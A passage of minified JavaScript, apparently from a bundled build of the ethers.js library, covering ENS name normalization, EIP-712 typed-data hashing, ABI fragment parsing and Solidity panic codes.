r=[];CUe(t[0])&&r.push(""),t.length>e&&(e>>=1,t=[...t.slice(0,e),8230,...t.slice(-e)]);let i=0,s=t.length;for(let o=0;o<s;o++){let a=t[o];bue(a)&&(r.push(q1(t.slice(i,o))),r.push(n(a)),i=o+1)}return r.push(q1(t.slice(i,s))),r.join("")}function CUe(t){return Sj(),qm.has(t)}function bue(t){return Sj(),yue.has(t)}function SUe(t){return RUe(TUe(t,wUe,OUe))}function TUe(t,e,n){if(!t)return[];Sj();let r=0;return t.split(hue).map(i=>{let s=cUe(i),o={input:s,offset:r};r+=s.length+1;try{let a=o.tokens=NUe(s,e,n),c=a.length,l;if(!c)throw new Error("empty label");let f=o.output=a.flat();if(_Ue(f),!(o.emoji=c>1||a[0].is_emoji)&&f.every(m=>m<128))EUe(f),l="ASCII";else{let m=a.flatMap(b=>b.is_emoji?[]:b);if(!m.length)l="Emoji";else{if(qm.has(f[0]))throw pE("leading combining mark");for(let y=1;y<c;y++){let E=a[y];if(!E.is_emoji&&qm.has(E[0]))throw pE(`emoji + combining mark: "${q1(a[y-1])} + ${I8([E[0]])}"`)}AUe(f);let b=gI(new Set(m)),[w]=IUe(b);PUe(w,m),xUe(w,b),l=w.N}}o.type=l}catch(a){o.error=a}return o})}function xUe(t,e){let n,r=[];for(let i of e){let s=Mb.get(i);if(s===mue)return;if(s){let o=s.M.get(i);if(n=n?n.filter(a=>o.has(a)):gI(o),!n.length)return}else r.push(i)}if(n){for(let i of n)if(r.every(s=>N_(i,s)))throw new Error(`whole-script confusable: ${t.N}/${i.N}`)}}function IUe(t){let e=c1;for(let n of t){let r=e.filter(i=>N_(i,n));if(!r.length)throw c1.some(i=>N_(i,n))?vue(e[0],n):wue(n);if(e=r,r.length==1)break}return e}function RUe(t){return t.map(({input:e,error:n,output:r})=>{if(n){let i=n.message;throw new Error(t.length==1?i:`Invalid label ${xj(I8(e,63))}: ${i}`)}return q1(r)}).join(hue)}function wue(t){return new Error(`disallowed character: ${Tj(t)}`)}function vue(t,e){let n=Tj(e),r=c1.find(i=>i.P.has(e));return r&&(n=`${r.N} ${n}`),new Error(`illegal mixture: ${t.N} + ${n}`)}function pE(t){return new Error(`illegal placement: ${t}`)}function PUe(t,e){for(let n of e)if(!N_(t,n))throw vue(t,n);if(t.M){let n=fue(e);for(let r=1,i=n.length;r<i;r++)if(yD.has(n[r])){let s=r+1;for(let o;s<i&&yD.has(o=n[s]);s++)for(let a=r;a<s;a++)if(n[a]==o)throw new Error(`duplicate non-spacing marks: ${Tj(o)}`);if(s-r>SG)throw new Error(`excessive non-spacing marks: ${xj(I8(n.slice(r-1,s)))} (${s-r}/${SG})`);r=s}}}function NUe(t,e,n){let r=[],i=[];for(t=t.slice().reverse();t.length;){let s=kUe(t);if(s)i.length&&(r.push(e(i)),i=[]),r.push(n(s));else{let o=t.pop();if(Cm.has(o))i.push(o);else{let a=gD.get(o);if(a)i.push(...a);else if(!gue.has(o))throw wue(o)}}}return i.length&&r.push(e(i)),r}function OUe(t){return t.filter(e=>e!=pue)}function kUe(t,e){let n=bD,r,i=t.length;for(;i&&(n=n.get(t[--i]),!!n);){let{V:s}=n;s&&(r=s,t.length=i)}return r}const Eue=new Uint8Array(32);Eue.fill(0);function RG(t){return pe(t.length!==0,"invalid ENS name; empty component","comp",t),t}function _ue(t){const e=Hl(DUe(t)),n=[];if(t.length===0)return n;let r=0;for(let i=0;i<e.length;i++)e[i]===46&&(n.push(RG(e.slice(r,i))),r=i+1);return pe(r<e.length,"invalid ENS name; empty component","name",t),n.push(RG(e.slice(r))),n}function DUe(t){try{if(t.length===0)throw new Error("empty label");return SUe(t)}catch(e){pe(!1,`invalid ENS name (${e.message})`,"name",t)}}function wD(t){pe(typeof t=="string","invalid ENS name; not a string","name",t),pe(t.length,"invalid ENS name (empty label)","name",t);let e=Eue;const n=_ue(t);for(;n.length;)e=Oi(Lr([e,Oi(n.pop())]));return rt(e)}function BUe(t,e){const n=e;return pe(n<=255,"DNS encoded label cannot exceed 255","length",n),rt(Lr(_ue(t).map(r=>{pe(r.length<=n,`label ${JSON.stringify(t)} exceeds ${n} bytes`,"name",t);const i=new Uint8Array(r.length+1);return i.set(r,1),i[0]=i.length-1,i})))+"00"}const Aue=new Uint8Array(32);Aue.fill(0);const jUe=BigInt(-1),Cue=BigInt(0),Sue=BigInt(1),MUe=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");function UUe(t){const e=an(t),n=e.length%32;return n?Lr([e,Aue.slice(n)]):rt(e)}const LUe=Lp(Sue,32),FUe=Lp(Cue,32),PG={name:"string",version:"string",chainId:"uint256",verifyingContract:"address",salt:"bytes32"},PO=["name","version","chainId","verifyingContract","salt"];function NG(t){return function(e){return pe(typeof e=="string",`invalid domain value for ${JSON.stringify(t)}`,`domain.${t}`,e),e}}const $Ue={name:NG("name"),version:NG("version"),chainId:function(t){const e=wt(t,"domain.chainId");return pe(e>=0,"invalid chain ID","domain.chainId",t),Number.isSafeInteger(e)?Number(e):Ru(e)},verifyingContract:function(t){try{return Vn(t).toLowerCase()}catch{}pe(!1,'invalid domain value "verifyingContract"',"domain.verifyingContract",t)},salt:function(t){const e=an(t,"domain.salt");return pe(e.length===32,'invalid domain value "salt"',"domain.salt",t),rt(e)}};function NO(t){{const e=t.match(/^(u?)int(\d+)$/);if(e){const n=e[1]==="",r=parseInt(e[2]);pe(r%8===0&&r!==0&&r<=256&&e[2]===String(r),"invalid numeric width","type",t);const i=Hm(MUe,n?r-1:r),s=n?(i+Sue)*jUe:Cue;return function(o){const a=wt(o,"value");return pe(a>=s&&a<=i,`value out-of-bounds for ${t}`,"value",a),Lp(n?lce(a,256):a,32)}}}{const e=t.match(/^bytes(\d+)$/);if(e){const n=parseInt(e[1]);return pe(n!==0&&n<=32&&e[1]===String(n),"invalid bytes width","type",t),function(r){const i=an(r);return pe(i.length===n,`invalid length for ${t}`,"value",r),UUe(r)}}}switch(t){case"address":return function(e){return Ff(Vn(e),32)};case"bool":return function(e){return e?LUe:FUe};case"bytes":return function(e){return Oi(e)};case"string":return function(e){return Rg(e)}}return null}function OG(t,e){return`${t}(${e.map(({name:n,type:r})=>r+" "+n).join(",")})`}function d6(t){const e=t.match(/^([^\x5b]*)((\x5b\d*\x5d)*)(\x5b(\d*)\x5d)$/);return e?{base:e[1],index:e[2]+e[4],array:{base:e[1],prefix:e[1]+e[2],count:e[5]?parseInt(e[5]):-1}}:{base:t}}class $a{primaryType;#e;get types(){return JSON.parse(this.#e)}#t;#n;constructor(e){this.#t=new Map,this.#n=new Map;const n=new Map,r=new Map,i=new Map,s={};Object.keys(e).forEach(c=>{s[c]=e[c].map(({name:l,type:f})=>{let{base:h,index:m}=d6(f);return h==="int"&&!e.int&&(h="int256"),h==="uint"&&!e.uint&&(h="uint256"),{name:l,type:h+(m||"")}}),n.set(c,new Set),r.set(c,[]),i.set(c,new Set)}),this.#e=JSON.stringify(s);for(const c in s){const l=new Set;for(const f of s[c]){pe(!l.has(f.name),`duplicate variable name ${JSON.stringify(f.name)} in ${JSON.stringify(c)}`,"types",e),l.add(f.name);const h=d6(f.type).base;pe(h!==c,`circular type reference to ${JSON.stringify(h)}`,"types",e),!NO(h)&&(pe(r.has(h),`unknown type ${JSON.stringify(h)}`,"types",e),r.get(h).push(c),n.get(c).add(h))}}const o=Array.from(r.keys()).filter(c=>r.get(c).length===0);pe(o.length!==0,"missing primary type","types",e),pe(o.length===1,`ambiguous primary types or unused types: ${o.map(c=>JSON.stringify(c)).join(", ")}`,"types",e),Lt(this,{primaryType:o[0]});function a(c,l){pe(!l.has(c),`circular type reference to ${JSON.stringify(c)}`,"types",e),l.add(c);for(const f of n.get(c))if(r.has(f)){a(f,l);for(const h of l)i.get(h).add(f)}l.delete(c)}a(this.primaryType,new Set);for(const[c,l]of i){const f=Array.from(l);f.sort(),this.#t.set(c,OG(c,s[c])+f.map(h=>OG(h,s[h])).join(""))}}getEncoder(e){let n=this.#n.get(e);return n||(n=this.#r(e),this.#n.set(e,n)),n}#r(e){{const i=NO(e);if(i)return i}const n=d6(e).array;if(n){const i=n.prefix,s=this.getEncoder(i);return o=>{pe(n.count===-1||n.count===o.length,`array length mismatch; expected length ${n.count}`,"value",o);let a=o.map(s);return this.#t.has(i)&&(a=a.map(Oi)),Oi(Lr(a))}}const r=this.types[e];if(r){const i=Rg(this.#t.get(e));return s=>{const o=r.map(({name:a,type:c})=>{const l=this.getEncoder(c)(s[a]);return this.#t.has(c)?Oi(l):l});return o.unshift(i),Lr(o)}}pe(!1,`unknown type: ${e}`,"type",e)}encodeType(e){const n=this.#t.get(e);return pe(n,`unknown type: ${JSON.stringify(e)}`,"name",e),n}encodeData(e,n){return this.getEncoder(e)(n)}hashStruct(e,n){return Oi(this.encodeData(e,n))}encode(e){return this.encodeData(this.primaryType,e)}hash(e){return this.hashStruct(this.primaryType,e)}_visit(e,n,r){if(NO(e))return r(e,n);const i=d6(e).array;if(i)return pe(i.count===-1||i.count===n.length,`array length mismatch; expected length ${i.count}`,"value",n),n.map(o=>this._visit(i.prefix,o,r));const s=this.types[e];if(s)return s.reduce((o,{name:a,type:c})=>(o[a]=this._visit(c,n[a],r),o),{});pe(!1,`unknown type: ${e}`,"type",e)}visit(e,n){return this._visit(this.primaryType,e,n)}static from(e){return new $a(e)}static getPrimaryType(e){return $a.from(e).primaryType}static hashStruct(e,n,r){return $a.from(n).hashStruct(e,r)}static hashDomain(e){const n=[];for(const r in e){if(e[r]==null)continue;const i=PG[r];pe(i,`invalid typed-data domain key: ${JSON.stringify(r)}`,"domain",e),n.push({name:r,type:i})}return n.sort((r,i)=>PO.indexOf(r.name)-PO.indexOf(i.name)),$a.hashStruct("EIP712Domain",{EIP712Domain:n},e)}static encode(e,n,r){return Lr(["0x1901",$a.hashDomain(e),$a.from(n).hash(r)])}static hash(e,n,r){return Oi($a.encode(e,n,r))}static async resolveNames(e,n,r,i){e=Object.assign({},e);for(const a in e)e[a]==null&&delete e[a];const s={};e.verifyingContract&&!gr(e.verifyingContract,20)&&(s[e.verifyingContract]="0x");const o=$a.from(n);o.visit(r,(a,c)=>(a==="address"&&!gr(c,20)&&(s[c]="0x"),c));for(const a in s)s[a]=await i(a);return e.verifyingContract&&s[e.verifyingContract]&&(e.verifyingContract=s[e.verifyingContract]),r=o.visit(r,(a,c)=>a==="address"&&s[c]?s[c]:c),{domain:e,value:r}}static getPayload(e,n,r){$a.hashDomain(e);const i={},s=[];PO.forEach(c=>{const l=e[c];l!=null&&(i[c]=$Ue[c](l),s.push({name:c,type:PG[c]}))});const o=$a.from(n);n=o.types;const a=Object.assign({},n);return pe(a.EIP712Domain==null,"types must not contain EIP712Domain type","types.EIP712Domain",n),a.EIP712Domain=s,o.encode(r),{types:a,domain:i,primaryType:o.primaryType,message:o.visit(r,(c,l)=>{if(c.match(/^bytes(\d*)/))return rt(an(l));if(c.match(/^u?int/))return wt(l).toString();switch(c){case"address":return l.toLowerCase();case"bool":return!!l;case"string":return pe(typeof l=="string","invalid string","value",l),l}pe(!1,"unsupported type","type",c)})}}}function yo(t){const e=new Set;return t.forEach(n=>e.add(n)),Object.freeze(e)}const HUe="external public payable override",zUe=yo(HUe.split(" ")),Tue="constant external internal payable private public pure view override",qUe=yo(Tue.split(" ")),xue="constructor error event fallback function receive struct",Iue=yo(xue.split(" ")),Rue="calldata memory storage payable indexed",VUe=yo(Rue.split(" ")),WUe="tuple returns",GUe=[xue,Rue,WUe,Tue].join(" "),KUe=yo(GUe.split(" ")),ZUe={"(":"OPEN_PAREN",")":"CLOSE_PAREN","[":"OPEN_BRACKET","]":"CLOSE_BRACKET",",":"COMMA","@":"AT"},YUe=new RegExp("^(\\s*)"),QUe=new RegExp("^([0-9]+)"),JUe=new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)"),Pue=new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$"),Nue=new RegExp("^(address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");class Vc{#e;#t;get offset(){return this.#e}get length(){return this.#t.length-this.#e}constructor(e){this.#e=0,this.#t=e.slice()}clone(){return new Vc(this.#t)}reset(){this.#e=0}#n(e=0,n=0){return new Vc(this.#t.slice(e,n).map(r=>Object.freeze(Object.assign({},r,{match:r.match-e,linkBack:r.linkBack-e,linkNext:r.linkNext-e}))))}popKeyword(e){const n=this.peek();if(n.type!=="KEYWORD"||!e.has(n.text))throw new Error(`expected keyword ${n.text}`);return this.pop().text}popType(e){if(this.peek().type!==e){const n=this.peek();throw new Error(`expected ${e}; got ${n.type} ${JSON.stringify(n.text)}`)}return this.pop().text}popParen(){const e=this.peek();if(e.type!=="OPEN_PAREN")throw new Error("bad start");const n=this.#n(this.#e+1,e.match+1);return this.#e=e.match+1,n}popParams(){const e=this.peek();if(e.type!=="OPEN_PAREN")throw new Error("bad start");const n=[];for(;this.#e<e.match-1;){const r=this.peek().linkNext;n.push(this.#n(this.#e+1,r)),this.#e=r}return this.#e=e.match+1,n}peek(){if(this.#e>=this.#t.length)throw new Error("out-of-bounds");return this.#t[this.#e]}peekKeyword(e){const n=this.peekType("KEYWORD");return n!=null&&e.has(n)?n:null}peekType(e){if(this.length===0)return null;const n=this.peek();return n.type===e?n.text:null}pop(){const e=this.peek();return this.#e++,e}toString(){const e=[];for(let n=this.#e;n<this.#t.length;n++){const r=this.#t[n];e.push(`${r.type}:${r.text}`)}return`<TokenString ${e.join(" ")}>`}}function t0(t){const e=[],n=o=>{const a=s<t.length?JSON.stringify(t[s]):"$EOI";throw new Error(`invalid token ${a} at ${s}: ${o}`)};let r=[],i=[],s=0;for(;s<t.length;){let o=t.substring(s),a=o.match(YUe);a&&(s+=a[1].length,o=t.substring(s));const c={depth:r.length,linkBack:-1,linkNext:-1,match:-1,type:"",text:"",offset:s,value:-1};e.push(c);let l=ZUe[o[0]]||"";if(l){if(c.type=l,c.text=o[0],s++,l==="OPEN_PAREN")r.push(e.length-1),i.push(e.length-1);else if(l=="CLOSE_PAREN")r.length===0&&n("no matching open bracket"),c.match=r.pop(),e[c.match].match=e.length-1,c.depth--,c.linkBack=i.pop(),e[c.linkBack].linkNext=e.length-1;else if(l==="COMMA")c.linkBack=i.pop(),e[c.linkBack].linkNext=e.length-1,i.push(e.length-1);else if(l==="OPEN_BRACKET")c.type="BRACKET";else if(l==="CLOSE_BRACKET"){let f=e.pop().text;if(e.length>0&&e[e.length-1].type==="NUMBER"){const h=e.pop().text;f=h+f,e[e.length-1].value=Qt(h)}if(e.length===0||e[e.length-1].type!=="BRACKET")throw new Error("missing opening bracket");e[e.length-1].text+=f}continue}if(a=o.match(JUe),a){if(c.text=a[1],s+=c.text.length,KUe.has(c.text)){c.type="KEYWORD";continue}if(c.text.match(Nue)){c.type="TYPE";continue}c.type="ID";continue}if(a=o.match(QUe),a){c.text=a[1],c.type="NUMBER",s+=c.text.length;continue}throw new Error(`unexpected token ${JSON.stringify(o[0])} at position ${s}`)}return new Vc(e.map(o=>Object.freeze(o)))}function kG(t,e){let n=[];for(const r in e.keys())t.has(r)&&n.push(r);if(n.length>1)throw new Error(`conflicting types: ${n.join(", ")}`)}function R8(t,e){if(e.peekKeyword(Iue)){const n=e.pop().text;if(n!==t)throw new Error(`expected ${t}, got ${n}`)}return e.popType("ID")}function $f(t,e){const n=new Set;for(;;){const r=t.peekType("KEYWORD");if(r==null||e&&!e.has(r))break;if(t.pop(),n.has(r))throw new Error(`duplicate keywords: ${JSON.stringify(r)}`);n.add(r)}return Object.freeze(n)}function Oue(t){let e=$f(t,qUe);return kG(e,yo("constant payable nonpayable".split(" "))),kG(e,yo("pure view payable nonpayable".split(" "))),e.has("view")?"view":e.has("pure")?"pure":e.has("payable")?"payable":e.has("nonpayable")?"nonpayable":e.has("constant")?"view":"nonpayable"}function Tf(t,e){return t.popParams().map(n=>Ar.from(n,e))}function kue(t){if(t.peekType("AT")){if(t.pop(),t.peekType("NUMBER"))return wt(t.pop().text);throw new Error("invalid gas")}return null}function Pg(t){if(t.length)throw new Error(`unexpected tokens at offset ${t.offset}: ${t.toString()}`)}const XUe=new RegExp(/^(.*)\[([0-9]*)\]$/);function DG(t){const e=t.match(Nue);if(pe(e,"invalid type","type",t),t==="uint")return"uint256";if(t==="int")return"int256";if(e[2]){const n=parseInt(e[2]);pe(n!==0&&n<=32,"invalid bytes length","type",t)}else if(e[3]){const n=parseInt(e[3]);pe(n!==0&&n<=256&&n%8===0,"invalid numeric width","type",t)}return t}const Kr={},sa=Symbol.for("_ethers_internal"),BG="_ParamTypeInternal",jG="_ErrorInternal",MG="_EventInternal",UG="_ConstructorInternal",LG="_FallbackInternal",FG="_FunctionInternal",$G="_StructInternal";class Ar{name;type;baseType;indexed;components;arrayLength;arrayChildren;constructor(e,n,r,i,s,o,a,c){if(SA(e,Kr,"ParamType"),Object.defineProperty(this,sa,{value:BG}),o&&(o=Object.freeze(o.slice())),i==="array"){if(a==null||c==null)throw new Error("")}else if(a!=null||c!=null)throw new Error("");if(i==="tuple"){if(o==null)throw new Error("")}else if(o!=null)throw new Error("");Lt(this,{name:n,type:r,baseType:i,indexed:s,components:o,arrayLength:a,arrayChildren:c})}format(e){if(e==null&&(e="sighash"),e==="json"){const r=this.name||"";if(this.isArray()){const s=JSON.parse(this.arrayChildren.format("json"));return s.name=r,s.type+=`[${this.arrayLength<0?"":String(this.arrayLength)}]`,JSON.stringify(s)}const i={type:this.baseType==="tuple"?"tuple":this.type,name:r};return typeof this.indexed=="boolean"&&(i.indexed=this.indexed),this.isTuple()&&(i.components=this.components.map(s=>JSON.parse(s.format(e)))),JSON.stringify(i)}let n="";return this.isArray()?(n+=this.arrayChildren.format(e),n+=`[${this.arrayLength<0?"":String(this.arrayLength)}]`):this.isTuple()?n+="("+this.components.map(r=>r.format(e)).join(e==="full"?", ":",")+")":n+=this.type,e!=="sighash"&&(this.indexed===!0&&(n+=" indexed"),e==="full"&&this.name&&(n+=" "+this.name)),n}isArray(){return this.baseType==="array"}isTuple(){return this.baseType==="tuple"}isIndexable(){return this.indexed!=null}walk(e,n){if(this.isArray()){if(!Array.isArray(e))throw new Error("invalid array value");if(this.arrayLength!==-1&&e.length!==this.arrayLength)throw new Error("array is wrong length");const r=this;return e.map(i=>r.arrayChildren.walk(i,n))}if(this.isTuple()){if(!Array.isArray(e))throw new Error("invalid tuple value");if(e.length!==this.components.length)throw new Error("array is wrong length");const r=this;return e.map((i,s)=>r.components[s].walk(i,n))}return n(this.type,e)}#e(e,n,r,i){if(this.isArray()){if(!Array.isArray(n))throw new Error("invalid array value");if(this.arrayLength!==-1&&n.length!==this.arrayLength)throw new Error("array is wrong length");const o=this.arrayChildren,a=n.slice();a.forEach((c,l)=>{o.#e(e,c,r,f=>{a[l]=f})}),i(a);return}if(this.isTuple()){const o=this.components;let a;if(Array.isArray(n))a=n.slice();else{if(n==null||typeof n!="object")throw new Error("invalid tuple value");a=o.map(c=>{if(!c.name)throw new Error("cannot use object value with unnamed components");if(!(c.name in n))throw new Error(`missing value for component ${c.name}`);return n[c.name]})}if(a.length!==this.components.length)throw new Error("array is wrong length");a.forEach((c,l)=>{o[l].#e(e,c,r,f=>{a[l]=f})}),i(a);return}const s=r(this.type,n);s.then?e.push((async function(){i(await s)})()):i(s)}async walkAsync(e,n){const r=[],i=[e];return this.#e(r,e,n,s=>{i[0]=s}),r.length&&await Promise.all(r),i[0]}static from(e,n){if(Ar.isParamType(e))return e;if(typeof e=="string")try{return Ar.from(t0(e),n)}catch{pe(!1,"invalid param type","obj",e)}else if(e instanceof Vc){let a="",c="",l=null;$f(e,yo(["tuple"])).has("tuple")||e.peekType("OPEN_PAREN")?(c="tuple",l=e.popParams().map(y=>Ar.from(y)),a=`tuple(${l.map(y=>y.format()).join(",")})`):(a=DG(e.popType("TYPE")),c=a);let f=null,h=null;for(;e.length&&e.peekType("BRACKET");){const y=e.pop();f=new Ar(Kr,"",a,c,null,l,h,f),h=y.value,a+=y.text,c="array",l=null}let m=null;if($f(e,VUe).has("indexed")){if(!n)throw new Error("");m=!0}const w=e.peekType("ID")?e.pop().text:"";if(e.length)throw new Error("leftover tokens");return new Ar(Kr,w,a,c,m,l,h,f)}const r=e.name;pe(!r||typeof r=="string"&&r.match(Pue),"invalid name","obj.name",r);let i=e.indexed;i!=null&&(pe(n,"parameter cannot be indexed","obj.indexed",e.indexed),i=!!i);let s=e.type,o=s.match(XUe);if(o){const a=parseInt(o[2]||"-1"),c=Ar.from({type:o[1],components:e.components});return new Ar(Kr,r||"",s,"array",i,null,a,c)}if(s==="tuple"||s.startsWith("tuple(")||s.startsWith("(")){const a=e.components!=null?e.components.map(l=>Ar.from(l)):null;return new Ar(Kr,r||"",s,"tuple",i,a,null,null)}return s=DG(e.type),new Ar(Kr,r||"",s,s,i,null,null,null)}static isParamType(e){return e&&e[sa]===BG}}class Ng{type;inputs;constructor(e,n,r){SA(e,Kr,"Fragment"),r=Object.freeze(r.slice()),Lt(this,{type:n,inputs:r})}static from(e){if(typeof e=="string"){try{Ng.from(JSON.parse(e))}catch{}return Ng.from(t0(e))}if(e instanceof Vc)switch(e.peekKeyword(Iue)){case"constructor":return vf.from(e);case"error":return Jo.from(e);case"event":return kl.from(e);case"fallback":case"receive":return pf.from(e);case"function":return Dl.from(e);case"struct":return Xm.from(e)}else if(typeof e=="object"){switch(e.type){case"constructor":return vf.from(e);case"error":return Jo.from(e);case"event":return kl.from(e);case"fallback":case"receive":return pf.from(e);case"function":return Dl.from(e);case"struct":return Xm.from(e)}qe(!1,`unsupported type: ${e.type}`,"UNSUPPORTED_OPERATION",{operation:"Fragment.from"})}pe(!1,"unsupported frgament object","obj",e)}static isConstructor(e){return vf.isFragment(e)}static isError(e){return Jo.isFragment(e)}static isEvent(e){return kl.isFragment(e)}static isFunction(e){return Dl.isFragment(e)}static isStruct(e){return Xm.isFragment(e)}}class P8 extends Ng{name;constructor(e,n,r,i){super(e,n,i),pe(typeof r=="string"&&r.match(Pue),"invalid identifier","name",r),i=Object.freeze(i.slice()),Lt(this,{name:r})}}function O_(t,e){return"("+e.map(n=>n.format(t)).join(t==="full"?", ":",")+")"}class Jo extends P8{constructor(e,n,r){super(e,"error",n,r),Object.defineProperty(this,sa,{value:jG})}get selector(){return Rg(this.format("sighash")).substring(0,10)}format(e){if(e==null&&(e="sighash"),e==="json")return JSON.stringify({type:"error",name:this.name,inputs:this.inputs.map(r=>JSON.parse(r.format(e)))});const n=[];return e!=="sighash"&&n.push("error"),n.push(this.name+O_(e,this.inputs)),n.join(" ")}static from(e){if(Jo.isFragment(e))return e;if(typeof e=="string")return Jo.from(t0(e));if(e instanceof Vc){const n=R8("error",e),r=Tf(e);return Pg(e),new Jo(Kr,n,r)}return new Jo(Kr,e.name,e.inputs?e.inputs.map(Ar.from):[])}static isFragment(e){return e&&e[sa]===jG}}class kl extends P8{anonymous;constructor(e,n,r,i){super(e,"event",n,r),Object.defineProperty(this,sa,{value:MG}),Lt(this,{anonymous:i})}get topicHash(){return Rg(this.format("sighash"))}format(e){if(e==null&&(e="sighash"),e==="json")return JSON.stringify({type:"event",anonymous:this.anonymous,name:this.name,inputs:this.inputs.map(r=>JSON.parse(r.format(e)))});const n=[];return e!=="sighash"&&n.push("event"),n.push(this.name+O_(e,this.inputs)),e!=="sighash"&&this.anonymous&&n.push("anonymous"),n.join(" ")}static getTopicHash(e,n){return n=(n||[]).map(i=>Ar.from(i)),new kl(Kr,e,n,!1).topicHash}static from(e){if(kl.isFragment(e))return e;if(typeof e=="string")try{return kl.from(t0(e))}catch{pe(!1,"invalid event fragment","obj",e)}else if(e instanceof Vc){const n=R8("event",e),r=Tf(e,!0),i=!!$f(e,yo(["anonymous"])).has("anonymous");return Pg(e),new kl(Kr,n,r,i)}return new kl(Kr,e.name,e.inputs?e.inputs.map(n=>Ar.from(n,!0)):[],!!e.anonymous)}static isFragment(e){return e&&e[sa]===MG}}class vf extends Ng{payable;gas;constructor(e,n,r,i,s){super(e,n,r),Object.defineProperty(this,sa,{value:UG}),Lt(this,{payable:i,gas:s})}format(e){if(qe(e!=null&&e!=="sighash","cannot format a constructor for sighash","UNSUPPORTED_OPERATION",{operation:"format(sighash)"}),e==="json")return JSON.stringify({type:"constructor",stateMutability:this.payable?"payable":"undefined",payable:this.payable,gas:this.gas!=null?this.gas:void 0,inputs:this.inputs.map(r=>JSON.parse(r.format(e)))});const n=[`constructor${O_(e,this.inputs)}`];return this.payable&&n.push("payable"),this.gas!=null&&n.push(`@${this.gas.toString()}`),n.join(" ")}static from(e){if(vf.isFragment(e))return e;if(typeof e=="string")try{return vf.from(t0(e))}catch{pe(!1,"invalid constuctor fragment","obj",e)}else if(e instanceof Vc){$f(e,yo(["constructor"]));const n=Tf(e),r=!!$f(e,zUe).has("payable"),i=kue(e);return Pg(e),new vf(Kr,"constructor",n,r,i)}return new vf(Kr,"constructor",e.inputs?e.inputs.map(Ar.from):[],!!e.payable,e.gas!=null?e.gas:null)}static isFragment(e){return e&&e[sa]===UG}}class pf extends Ng{payable;constructor(e,n,r){super(e,"fallback",n),Object.defineProperty(this,sa,{value:LG}),Lt(this,{payable:r})}format(e){const n=this.inputs.length===0?"receive":"fallback";if(e==="json"){const r=this.payable?"payable":"nonpayable";return JSON.stringify({type:n,stateMutability:r})}return`${n}()${this.payable?" payable":""}`}static from(e){if(pf.isFragment(e))return e;if(typeof e=="string")try{return pf.from(t0(e))}catch{pe(!1,"invalid fallback fragment","obj",e)}else if(e instanceof Vc){const n=e.toString(),r=e.peekKeyword(yo(["fallback","receive"]));if(pe(r,"type must be fallback or receive","obj",n),e.popKeyword(yo(["fallback","receive"]))==="receive"){const a=Tf(e);return pe(a.length===0,"receive cannot have arguments","obj.inputs",a),$f(e,yo(["payable"])),Pg(e),new pf(Kr,[],!0)}let s=Tf(e);s.length?pe(s.length===1&&s[0].type==="bytes","invalid fallback inputs","obj.inputs",s.map(a=>a.format("minimal")).join(", ")):s=[Ar.from("bytes")];const o=Oue(e);if(pe(o==="nonpayable"||o==="payable","fallback cannot be constants","obj.stateMutability",o),$f(e,yo(["returns"])).has("returns")){const a=Tf(e);pe(a.length===1&&a[0].type==="bytes","invalid fallback outputs","obj.outputs",a.map(c=>c.format("minimal")).join(", "))}return Pg(e),new pf(Kr,s,o==="payable")}if(e.type==="receive")return new pf(Kr,[],!0);if(e.type==="fallback"){const n=[Ar.from("bytes")],r=e.stateMutability==="payable";return new pf(Kr,n,r)}pe(!1,"invalid fallback description","obj",e)}static isFragment(e){return e&&e[sa]===LG}}class Dl extends P8{constant;outputs;stateMutability;payable;gas;constructor(e,n,r,i,s,o){super(e,"function",n,i),Object.defineProperty(this,sa,{value:FG}),s=Object.freeze(s.slice()),Lt(this,{constant:r==="view"||r==="pure",gas:o,outputs:s,payable:r==="payable",stateMutability:r})}get selector(){return Rg(this.format("sighash")).substring(0,10)}format(e){if(e==null&&(e="sighash"),e==="json")return JSON.stringify({type:"function",name:this.name,constant:this.constant,stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas!=null?this.gas:void 0,inputs:this.inputs.map(r=>JSON.parse(r.format(e))),outputs:this.outputs.map(r=>JSON.parse(r.format(e)))});const n=[];return e!=="sighash"&&n.push("function"),n.push(this.name+O_(e,this.inputs)),e!=="sighash"&&(this.stateMutability!=="nonpayable"&&n.push(this.stateMutability),this.outputs&&this.outputs.length&&(n.push("returns"),n.push(O_(e,this.outputs))),this.gas!=null&&n.push(`@${this.gas.toString()}`)),n.join(" ")}static getSelector(e,n){return n=(n||[]).map(i=>Ar.from(i)),new Dl(Kr,e,"view",n,[],null).selector}static from(e){if(Dl.isFragment(e))return e;if(typeof e=="string")try{return Dl.from(t0(e))}catch{pe(!1,"invalid function fragment","obj",e)}else if(e instanceof Vc){const r=R8("function",e),i=Tf(e),s=Oue(e);let o=[];$f(e,yo(["returns"])).has("returns")&&(o=Tf(e));const a=kue(e);return Pg(e),new Dl(Kr,r,s,i,o,a)}let n=e.stateMutability;return n==null&&(n="payable",typeof e.constant=="boolean"?(n="view",e.constant||(n="payable",typeof e.payable=="boolean"&&!e.payable&&(n="nonpayable"))):typeof e.payable=="boolean"&&!e.payable&&(n="nonpayable")),new Dl(Kr,e.name,n,e.inputs?e.inputs.map(Ar.from):[],e.outputs?e.outputs.map(Ar.from):[],e.gas!=null?e.gas:null)}static isFragment(e){return e&&e[sa]===FG}}class Xm extends P8{constructor(e,n,r){super(e,"struct",n,r),Object.defineProperty(this,sa,{value:$G})}format(){throw new Error("@TODO")}static from(e){if(typeof e=="string")try{return Xm.from(t0(e))}catch{pe(!1,"invalid struct fragment","obj",e)}else if(e instanceof Vc){const n=R8("struct",e),r=Tf(e);return Pg(e),new Xm(Kr,n,r)}return new Xm(Kr,e.name,e.inputs?e.inputs.map(Ar.from):[])}static isFragment(e){return e&&e[sa]===$G}}const Wu=new Map;Wu.set(0,"GENERIC_PANIC");Wu.set(1,"ASSERT_FALSE");Wu.set(17,"OVERFLOW");Wu.set(18,"DIVIDE_BY_ZERO");Wu.set(33,"ENUM_RANGE_ERROR");Wu.set(34,"BAD_STORAGE_DATA");Wu.set(49,"STACK_UNDERFLOW");Wu.set(50,"ARRAY_RANGE_ERROR");Wu.set(65,"OUT_OF_MEMORY");Wu.set(81,"UNINITIALIZED_FUNCTION_CALL");const eLe=new RegExp(/^bytes([0-9]*)$/),tLe=new RegExp(/^(u?int)([0-9]*)$/);let OO=null,HG=1024;function nLe(t,e,n,r){let i="missing revert data",s=null;const o=null;let a=null;if(n){i="execution reverted";const l=an(n);if(n=rt(n),l.length===0)i+=" (no data present; likely require(false) 